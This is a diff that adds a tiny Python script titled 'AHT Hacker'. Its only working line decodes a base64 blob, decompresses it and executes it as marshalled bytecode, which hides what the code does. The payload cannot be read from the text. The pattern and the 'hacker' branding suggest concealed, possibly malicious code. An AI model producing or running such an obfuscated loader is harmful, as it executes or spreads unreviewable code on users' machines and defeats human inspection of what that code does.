@@ -1,0 +1,4 @@
+# AHT Hacker
+# Coded BY : Ahmed Ragep
+import marshal,zlib,base64
+exec(marshal.loads(zlib.decompress(base64.b64decode("eJxNT00LwjAMTTcVBT/+wo67uB08iCLiwIsXL9686VrYdF1Hmzp79odrKgMNyUtekgdJDp0FFDsKsyTg5AwqgDOAALgx4AG8GLCOhP+k9yW0f4r7pC3fZEezohKFlvY5V42oowKxMes0bds2ccqivYokVzLN06yQgmcVKn13Wc21KrmZkVo+orJOGhcl32Sm1GscFqpedK3YH40elMGBP94ZFDL2//zAjAhOVl60jg57HBLbSMVtJbahH3vhOJiwCfsAvNo8OQ=="))))
